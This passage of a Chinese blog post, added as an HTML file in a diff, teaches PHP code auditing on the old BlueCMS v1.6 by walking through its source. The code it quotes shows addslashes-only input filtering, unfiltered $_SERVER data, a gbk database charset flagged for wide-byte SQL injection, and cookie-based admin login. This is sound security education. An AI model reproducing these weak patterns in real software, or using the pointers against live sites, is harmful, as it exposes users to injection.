@@ -1,0 +1,654 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="jelly">
+  <meta name="keywords" content="">
+  
+  <title>通过 BlueCMS 学习 php 代码审计 - jelly&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":"14de5c0cf6db6044f06b32ef50694a98","google":"G-1S553HH16G","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Jelly's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/doll.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="通过 BlueCMS 学习 php 代码审计">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-10 02:02" pubdate>
+        2021年9月10日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      63
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">通过 BlueCMS 学习 php 代码审计</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近一直在学习php代码审计，入门过程比自己想象的慢很多，现在各个行业都在内卷，代码审计随着 web 开发技术的发展也会变得更加复杂。但不管现在技术多成熟，多复杂，基础知识一定要扎实。先记录下我目前学习php代码审计的过程：</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">php基础语法巩固 -&gt; php特性 -&gt; 各漏洞挖掘方法 -&gt; 从早期到近代的无MVC架构的CMS代码审计实战 -&gt; 成熟的MVC架构代码审计实战<br></code></pre></td></tr></table></figure>
+
+<p>网上已经有很多讲解如何去审计各种php程序漏洞的博客，大家都讲的很好，但学完这些知识后去真正上手审计一个CMS时，会突然发现自己什么都不会，我总结原因是自己的 web 开发知识太少了，不理解程序的逻辑，导致在审计大量代码时会晕头转向，没有方向</p>
+<p>然后我边学最基础的web开发知识， 边找最简单的 CMS 实战审计，然后逐渐增加难度，慢慢的找到了感觉。目前我认为自己还是一个菜鸡，确实也还是一个菜鸡，所以自己打算好好整理 <code>从早期到近代的无MVC架构的CMS代码审计实战 -&gt; 成熟的MVC架构代码审计实战</code> 的过程，并在博客上发表</p>
+<p> <code>从早期到近代的无MVC架构的CMS代码审计实战 </code> 我依次选择了 BlueCMS, SeaCMS, DedeCMS, PhpCMS 这 4 个CMS，理由很简单，从简单到难，与之对应的是他们的活跃时间也逐渐靠近我们，在对这几个系统的代码审计过程中，也能感受到 web 开发技术的发展和趋势，相信完成这步后再审计非 MVC 架构的程序代码就会具有清晰的思路与把握</p>
+<h1 id="0x01-BlueCMS-简介"><a href="#0x01-BlueCMS-简介" class="headerlink" title="0x01 BlueCMS 简介"></a>0x01 BlueCMS 简介</h1><p>BlueCMS 是一款应用于地方分类信息的门户系统，本文下载的源码为 BlueCMS v1.6 sp1版，可以追溯到2010年左右了，该系统确实很老，但审计该系统有一个好处是，即使现在web开发技术十分成熟了，但仍有人因为经验缺乏或时间原因会开发出类似BlueCMS这样简单的系统，甚至比BlueCMS更简单。通过对 BlueCMS 实战审计，能够熟悉这类简单 CMS 的程序逻辑</p>
+<p>BlueCMS 被认为是练手代码审计的绝佳项目，以至于现在百度BlueCMS的关键词全是代码审计。那为什么 BlueCMS 都被审计烂了，我还要在发一篇BlueCMS的代码审计博客呢？首先BlueCMS确实经典，是一个入门的好项目；其次BlueCMS是无MVC架构时期最早流行的一批CMS，是 <code>从早期到近代无MVC架构的CMS代码审计实战 </code> 系列最标志的第一环</p>
+<p>BlueCMS 源码也不太好找，这里推荐站长之家（<a target="_blank" rel="noopener" href="http://down.chinaz.com/%EF%BC%89%EF%BC%8Cyyds">http://down.chinaz.com/），yyds</a></p>
+<p>BlueCMS本地部署好后，先访问 /install/index.php 进行安装，感觉过程有点bug，不过返回首页后会发现安装成功</p>
+<h1 id="0x02-全局分析"><a href="#0x02-全局分析" class="headerlink" title="0x02 全局分析"></a>0x02 全局分析</h1><p>在学完php的各漏洞代码审计方法后我就直接利用 seay 去扫描代码敏感关键字回溯的方法去审计代码，但在过程中却逐渐蒙圈，经验总结，在审计一个成熟的CMS之间，还是要做好全局分析的工作</p>
+<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>通过目录结构可以简单看出程序的逻辑</p>
+<p>目录结构主要关注入口文件index.php在程序中的位置，BlueCMS时期的程序 index.php 基本位于程序根目录下，其实这是不安全的，会导致整个程序文件被窃取的风险，在审计后面的CMS中会发现这个问题会改善</p>
+<img src="img/blueCMS/image-20210527105213302.png" srcset="/img/loading.gif" lazyload alt="image-20210527105213302" style="zoom:50%;" />
+
+<h2 id="首页-index-php"><a href="#首页-index-php" class="headerlink" title="首页 index.php"></a>首页 index.php</h2><ul>
+<li>首页 index.php 首先会加载 <code>common.inc.php</code>，<code>include/index.fun.php</code> 这些文件具体做了什么后面仔细分析</li>
+<li>然后 index.php 就从数据库中获取首页信息，利用smarty模板显示。Smarty是BlueCMS引用的一个成熟的PHP模板引擎，Smarty在那个时期也是很火的，关于Smarty的具体实现代码我们就可以忽略了</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;include/common.inc.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/index.fun.php&#x27;</span>);<br><span class="hljs-comment">// 获取新闻栏目、新闻分类列表、网站公告等数据</span><br>……<br><span class="hljs-comment">// 利用smarty模板引擎显示页面</span><br><span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;index.htm&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>可以看出index.php并不能算入口文件，它只是在做一个页面的显示工作，从这里我们大概知道前台是一个多入口的模式，注意多入口的系统需要对每个入口文件单独做安全过滤，它们通常都会加载同一个文件来实现，在BlueCMS中这个文件就是common.inc.php</p>
+<h2 id="include-common-inc-php"><a href="#include-common-inc-php" class="headerlink" title="include/common.inc.php"></a>include/common.inc.php</h2><ul>
+<li>对GPC数据做了过滤，但外部可控数据还包括 <code>$_SERVER</code>没有经过过滤</li>
+<li>还需要留意的是 comon.inc.php 还做好了数据库连接工作，$db 为连接数据的对象，后续可以直接使用</li>
+<li>comon.inc.php 的其他处理逻辑注释即可</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载一些基础文件</span><br><span class="hljs-keyword">require_once</span> (BLUE_ROOT.<span class="hljs-string">&#x27;include/common.fun.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/cat.fun.php&#x27;</span>);<br><br><span class="hljs-comment">// 外部数据过滤</span><br><span class="hljs-keyword">if</span>(!get_magic_quotes_gpc())<br>&#123;<br>	<span class="hljs-variable">$_POST</span> = deep_addslashes(<span class="hljs-variable">$_POST</span>);<br>	<span class="hljs-variable">$_GET</span> = deep_addslashes(<span class="hljs-variable">$_GET</span>);<br>	<span class="hljs-variable">$_COOKIES</span> = deep_addslashes(<span class="hljs-variable">$_COOKIES</span>);<br>	<span class="hljs-variable">$_REQUEST</span> = deep_addslashes(<span class="hljs-variable">$_REQUEST</span>);<br>&#125;<br><br><span class="hljs-comment">// 数据库链接</span><br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/mysql.class.php&#x27;</span>);<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> mysql(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-comment">// Smarty模板对象就是这引入的</span><br><span class="hljs-keyword">require</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/smarty/Smarty.class.php&#x27;</span>);<br><span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> Smarty();<br><br><span class="hljs-comment">// 用户ip处理</span><br><span class="hljs-variable">$banned_ip</span> = get_bannedip();<br><span class="hljs-keyword">if</span> (@in_array(<span class="hljs-variable">$online_ip</span>, <span class="hljs-variable">$banned_ip</span>))<br>&#123;<br>	showmsg(<span class="hljs-string">&#x27;对不起，您的IP已被禁止，有问题请联系管理员!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="外部数据的具体过滤方式"><a href="#外部数据的具体过滤方式" class="headerlink" title="外部数据的具体过滤方式"></a>外部数据的具体过滤方式</h3><p>追踪一下<code>deep_addslashes()</code>方法，看下数据过滤的具体实现方式</p>
+<blockquote>
+<p>/include/common.fun.php</p>
+</blockquote>
+<p>具体过滤函数是addslashes()，在此情况下引号形式的sql注入基本会被过滤，所以凡是加了common.inc.php的入口文件，基本会实现这些过滤操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// include/common.fun.php 14-28:</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deep_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$str</span>))<br>	&#123;<br>		<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$str</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)<br>		&#123;<br>			<span class="hljs-variable">$str</span>[<span class="hljs-variable">$key</span>] = deep_addslashes(<span class="hljs-variable">$val</span>);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-variable">$str</span> = addslashes(<span class="hljs-variable">$str</span>);<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="数据库连接方式"><a href="#数据库连接方式" class="headerlink" title="数据库连接方式"></a>数据库连接方式</h3><blockquote>
+<p>include/mysql.class.php</p>
+</blockquote>
+<ul>
+<li>数据库连接方法是mysql_connect()，<code>$linkid</code>存放<strong>MySQL 连接标识</strong></li>
+<li>这里应该提取到一个十分关键的信息，数据库编码为gbk，那么程序就有宽字节注入的可能</li>
+<li>然后会看到mysql类还封装了很多底层sql的执行方法，知道这些方法是干嘛的就行</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br>		<span class="hljs-keyword">var</span> <span class="hljs-variable">$linkid</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpw</span>, <span class="hljs-variable">$dbname</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$dbcharset</span> = <span class="hljs-string">&#x27;gbk&#x27;</span>, <span class="hljs-variable">$connect</span> = <span class="hljs-number">1</span></span>) </span>&#123;<br>    	<span class="hljs-keyword">$this</span> -&gt; mysql(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpw</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$dbcharset</span>, <span class="hljs-variable">$connect</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mysql</span>(<span class="hljs-params"><span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpw</span>, <span class="hljs-variable">$dbname</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$dbcharset</span> = <span class="hljs-string">&#x27;gbk&#x27;</span>, <span class="hljs-variable">$connect</span>=<span class="hljs-number">1</span></span>)</span>&#123;<br>    	<span class="hljs-variable">$func</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$connect</span>) ? <span class="hljs-string">&#x27;mysql_pconnect&#x27;</span> : <span class="hljs-string">&#x27;mysql_connect&#x27;</span>;<br>    	<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;linkid = @<span class="hljs-variable">$func</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpw</span>, <span class="hljs-literal">true</span>))&#123;<br>    		<span class="hljs-keyword">$this</span>-&gt;dbshow(<span class="hljs-string">&#x27;Can not connect to Mysql!&#x27;</span>);<br>    	&#125; <span class="hljs-keyword">else</span> &#123;<br>    		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;dbversion() &gt; <span class="hljs-string">&#x27;4.1&#x27;</span>)&#123;<br>    			mysql_query( <span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br>    		&#125;<br>    	&#125;<br>    &#125;<br>  	<span class="hljs-comment">// mysql_query()封装执行sql语句的方法</span><br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">query</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;<br>    	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$query</span>=@mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;linkid))&#123;<br>    		<span class="hljs-keyword">$this</span>-&gt;dbshow(<span class="hljs-string">&quot;Query error:<span class="hljs-subst">$sql</span>&quot;</span>);<br>    	&#125;<span class="hljs-keyword">else</span>&#123;<br>    		<span class="hljs-keyword">return</span> <span class="hljs-variable">$query</span>;<br>    	&#125;<br>    &#125;<br>  	<span class="hljs-comment">//	getone() 封装查询数据的方法</span><br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getone</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>, <span class="hljs-variable">$type</span>=MYSQL_ASSOC</span>)</span>&#123;<br>    	<span class="hljs-variable">$query</span> = <span class="hljs-keyword">$this</span>-&gt;query(<span class="hljs-variable">$sql</span>,<span class="hljs-keyword">$this</span>-&gt;linkid);<br>    	<span class="hljs-variable">$row</span> = mysql_fetch_array(<span class="hljs-variable">$query</span>, <span class="hljs-variable">$type</span>);<br>    	<span class="hljs-keyword">return</span> <span class="hljs-variable">$row</span>;<br>    &#125;<br>  ……<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="后台逻辑分析"><a href="#后台逻辑分析" class="headerlink" title="后台逻辑分析"></a>后台逻辑分析</h2><p>后台一般只有通过身份验证后才能访问，提前就有一层安全保障，但后台程序一般都是漏洞百出，我们很多时候只有靠后台才能拿到服务器的shell。这里具体分析一下BlueCMS的后台逻辑</p>
+<h3 id="后台入口文件"><a href="#后台入口文件" class="headerlink" title="后台入口文件"></a>后台入口文件</h3><blockquote>
+<p>admin/index.php</p>
+</blockquote>
+<ul>
+<li>admin/index.php 的大部分逻辑由 admin/include/common.inc.php 处理</li>
+<li>index.php 剩下内容主要用于显示后台的页面</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/include/common.inc.php&quot;</span>);<br><span class="hljs-variable">$act</span>=!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]) ? trim(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span>==<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>  <span class="hljs-comment">// 显示后台页面</span><br>  <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;index.htm&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span>==<span class="hljs-string">&#x27;top&#x27;</span>)<br>&#123;<br>	<span class="hljs-comment">// 显示顶部</span><br>	<span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;top.htm&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span>==<span class="hljs-string">&#x27;menu&#x27;</span>)&#123;<br>  <span class="hljs-comment">// 显示菜单</span><br>  <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;menu.htm&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;main&#x27;</span>)&#123;<br>  <span class="hljs-comment">// 显示主体页面</span><br>  <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;main.htm&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>admin/templates/default/index.htm</p>
+</blockquote>
+<p>关注 index.htm 可以知道后台是通过frame来实现的，这样后台程序的所有功能都可以依附在index.php下实现，在早期的CMS中，基本都是这种实现方案</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;76,*&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;index.php?act=top&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;topFrame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;topFrame&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">noresize</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;176,*&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bodyFrame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bodyFrame&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span>  &gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;index.php?act=menu&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;menuFrame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;menuFrame&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-attr">noresize</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;index.php?act=main&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mainFrame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mainFrame&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;auto&quot;</span> <span class="hljs-attr">noresize</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="common-inc-php处理细节"><a href="#common-inc-php处理细节" class="headerlink" title="common.inc.php处理细节"></a>common.inc.php处理细节</h3><blockquote>
+<p>admin/include/common.inc.php</p>
+</blockquote>
+<p>该文件内容和 include/common.inc.php 差不多，不同之处在于多了管理员的认证，如果看到加载了 include/common.inc.php 的文件，那么该文件基本为后台访问页面</p>
+<ul>
+<li>可以看到 BlueCMS 主要通过session的方法认证用户登陆状态，如果 <code>$_SESSION[&#39;admin_id&#39;]</code> 存在则通过验证并刷新用户登陆记录</li>
+<li>当前用户 session 信息为空时则会判断用户的cookie信息，如果设置了cookie信息则判断cookie的账号密码是否能登陆</li>
+<li>如果未设置cookie信息，则跳转到<code>login.php?act=login</code>页面重新登陆</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 加载一些基础文件</span><br><span class="hljs-keyword">require_once</span>(……)<br><span class="hljs-comment">// 外部数据过滤</span><br>deep_addslashes()<br><span class="hljs-comment">// 数据库链接</span><br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/mysql.class.php&#x27;</span>);<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> mysql(<span class="hljs-variable">$dbhost</span>,<span class="hljs-variable">$dbuser</span>,<span 